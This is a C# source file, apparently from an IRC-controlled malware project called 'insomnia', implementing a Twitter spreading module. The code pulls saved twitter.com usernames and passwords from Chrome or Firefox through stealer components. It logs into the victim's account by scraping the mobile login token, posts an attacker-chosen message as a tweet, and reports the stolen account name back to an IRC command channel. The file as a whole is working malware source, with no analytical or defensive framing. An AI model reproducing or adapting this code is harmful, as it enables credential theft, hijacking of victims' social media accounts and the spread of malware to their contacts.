using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Text.RegularExpressions;
using System.IO;
using insomnia.Stealers;

namespace insomnia
{
    internal class Twitter
    {
        public static void StartTwitterSpread(string[] message)
        {
            try
            {
                string creds = Chrome.QueryChrome("twitter.com");
                if (String.IsNullOrEmpty(creds))
                    creds = Firefox.QueryFirefox("twitter.com");
                string[] auth = creds.Split(':');
                string user = auth[0];
                string pass = auth[1];

                if (creds != "")
                {
                    bool buildMsg = false;
                    string spreadMsg = "";

                    foreach (string s in message)
                    {
                        if (s.StartsWith("\""))
                            buildMsg = true;

                        if (s.EndsWith("\""))
                        {
                            buildMsg = false;
                            spreadMsg += s;
                        }

                        if (buildMsg)
                            spreadMsg += s + " ";
                    }

                    spreadMsg = spreadMsg.Replace("\"", "");
                    spreadMsg.TrimEnd(' ');

                    if (spreadMsg != "")
                        if (PostTweet(user, pass, spreadMsg))
                            IRC.WriteMessage("Twitter status updated:" + IRC.ColorCode(" " + user) + " ->" + IRC.ColorCode(" " + spreadMsg) + ".", Config._mainChannel());
                }
            }
            catch
            {
                // No facebook account saved.
            }
        }

        public static bool PostTweet(string user, string pass, string tweet)
        {
            CookieContainer cookies = new CookieContainer();

            string init = HttpGet("https://mobile.twitter.com/session/new", ref cookies);
            string token = "";
            int index = init.IndexOf("<input name=\"authenticity_token\"");
            if (index > -1)
            {
                Regex regex = new Regex(" type=\"hidden\" value=\"(.*?)\" />");
                Match match = regex.Match(init);

                if (match.Success)
                {
                    string hash = match.Groups[1].Value;
                    token = hash;
                }
            }
            HttpPost("https://mobile.twitter.com/session/", "authenticity_token=" + token + "&username=" + user + "&password=" + pass, ref cookies, "https://mobile.twitter.com/session/new");
            string check = HttpGet("https://mobile.twitter.com/", ref cookies);

            if (check.Contains("Sign out"))
            {
                string results = HttpPost("https://mobile.twitter.com/", "authenticity_token=" + token + "&tweet%5Btext%5D=" + Uri.EscapeUriString(tweet) + "&tweet%5Bin_reply_to_status_id%5D=&tweet%5Blat%5D=&tweet%5Blong%5D=&tweet%5Bplace_id%5D=&tweet%5Bdisplay_coordinates%5D=", ref cookies, "https://mobile.twitter.com");
                return true;
            }
            else
                return false;
        }

        static string HttpPost(string url, string data, ref CookieContainer cookies, string referrer)
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.KeepAlive = true;
                request.ProtocolVersion = HttpVersion.Version11;
                request.Method = "POST";
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Gecko/20100101 Firefox/9.0.1";
                request.Referer = referrer;

                if ((cookies != null))
                {
                    request.CookieContainer = cookies;
                }

                // turn our request string into a byte stream
                byte[] postBytes = Encoding.ASCII.GetBytes(data);

                // this is important - make sure you specify type this way
                request.ContentType = "application/x-www-form-urlencoded";
                request.ContentLength = postBytes.Length;
                Stream requestStream = request.GetRequestStream();

                // now send it
                requestStream.Write(postBytes, 0, postBytes.Length);
                requestStream.Close();

                // grab te response and print it out to the console along with the status code
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                return (new StreamReader(response.GetResponseStream()).ReadToEnd());
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        static string HttpGet(string url, ref CookieContainer cookies)
        {
            string result = String.Empty;
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.KeepAlive = true;
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Gecko/20100101 Firefox/8.0.1";

                request.ServicePoint.Expect100Continue = false;
                if ((cookies != null))
                {
                    request.CookieContainer = cookies;
                }
                using (HttpWebResponse response = request.GetResponse() as HttpWebResponse)
                {
                    if (cookies != null)
                    {
                        cookies.Add(response.Cookies);
                    }
                    using (Stream responseStream = response.GetResponseStream())
                    {
                        using (StreamReader reader = new StreamReader(responseStream))
                        {
                            result = reader.ReadToEnd();
                        }
                    }
                }
                return result;
            }
            catch
            {
                return result;
            }
        }
    }
}
